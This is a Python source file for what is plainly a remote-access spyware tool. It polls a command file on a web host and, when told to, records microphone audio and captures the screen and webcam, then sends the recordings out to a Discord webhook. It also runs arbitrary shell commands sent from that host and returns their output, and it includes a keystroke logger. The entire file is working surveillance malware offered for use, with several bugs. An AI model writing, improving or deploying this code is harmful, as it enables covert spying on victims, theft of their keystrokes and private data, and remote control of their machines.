import cv2
import os
import pyautogui
import time
import sounddevice as sd
import numpy as np
import requests
import subprocess
import logging
import threading
from pydub import AudioSegment
from discord import SyncWebhook, File
from bs4 import BeautifulSoup
from pynput.keyboard import Listener


cap = cv2.VideoCapture(0)
save_path = os.path.dirname(os.path.realpath(__file__))
webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/{Your hook url}")
url = "http://{your webhost}/command.txt"
last_command = "None"
keystrokes_file_path = "keystrokes.txt"
logging.basicConfig(filename="keystrokes.txt", level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def start_strokes_log():
    with Listener(on_press=on_press) as listener:
        listener.join()

def record_audio(duration, sample_rate=44100):
    audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
    sd.wait()
    return audio_data

def save_audio_as_mp3(audio_data, filename, sample_rate=44100):
    audio = AudioSegment(
        data=audio_data.tobytes(),
        sample_width=audio_data.dtype.itemsize,
        frame_rate=sample_rate,
        channels=1
    )
    audio.export(filename, format="mp3", bitrate="128k")
    return filename

def take_screenshot():
    file_name = f"screenshot.png"
    file_path = os.path.join(save_path, file_name)
    screenshot = pyautogui.screenshot()
    screenshot = screenshot.resize((800, 600))
    screenshot.save(file_path)
    return file_path

def take_cam():
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            frame = cv2.resize(frame, (800, 600))
            file_name = f"selfie.png"
            file_path = os.path.join(save_path, file_name)
            cv2.imwrite(file_path, frame)
            return file_path
    return None

def send_to_discord(file_paths):
    for file_path in file_paths:
        if file_path:
            file_size = os.path.getsize(file_path)
            if file_size > 8 * 1024 * 1024:
                print(f"File {file_path} is too large to send. Size: {file_size / (1024 * 1024):.2f} MB")
            with open(file_path, 'rb') as f:
                webhook.send(file=File(f, filename=os.path.basename(file_path)))

def console(command):
    try:
        subcmd = subprocess.check_output(f"{command}", shell=True)
        subcmd = subcmd
        webhook.send("Command executed!")
        webhook.send(subcmd)
    except:
        print("command has failed return to main loop")
        webhook.send("Failed to execute command")

try:
    while True:
        try:
            time.sleep(1)
            response = requests.get(url)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                command = soup.string
                if last_command == command:
                    print("Awaiting new incomming command")
                else:
                    print(command)
                    if command.startswith("spy" or "Spy" or "SPY"):
                        interfall = command[3:].strip()
                        last_command = command
                        while True:             
                            audio_data = record_audio(interfall)
                            print("audio recorded")
                            saved_mp3_path = save_audio_as_mp3(audio_data, "msg.mp3")
                            print("audio saved")
                            send_to_discord(take_screenshot())
                            send_to_discord(take_cam())
                            send_to_discord(saved_mp3_path)
                            print("send to discord")
                            os.remove("screenshot.png")
                            os.remove("selfie.png")
                            os.remove("msg.wav")
                            response = requests.get(url)
                            if response.status_code == 200:
                                soup = BeautifulSoup(response.text, "html.parser")
                                if soup.string != last_command:
                                    break
                    elif command.startswith("console" or "Console" or "CONSOLE"):
                        command = command[7:].strip()
                        if command != last_command:
                            last_command = command
                            console(command)
                    elif command == "logger" or command == "Logger" or command == "LOGGER":
                        print("KeyLogger")
                    else:
                        print(f"invalid commando: {command}")
            else:
                print("Connection failed waiting to reconnect")
                time.sleep(5)               
        except Exception as error:
            last_command = "None"
            print(f"Error occurred: {error}")
            print("Waiting for 1 seconds to retry!")
            try:
                webhook.send(content=f"Error occurred: {error}")
            except Exception as webhook_error:
                print(f"Failed to send error to Discord: {webhook_error}")
            time.sleep(1)
except Exception as error:
        last_command = "None"
        print(f"Error occurred: {error}")
        print("Waiting for 1 seconds to retry!")
        try:
            webhook.send(content=f"Error occurred: {error}")
        except Exception as webhook_error:
            print(f"Failed to send error to Discord: {webhook_error}")
        time.sleep(1)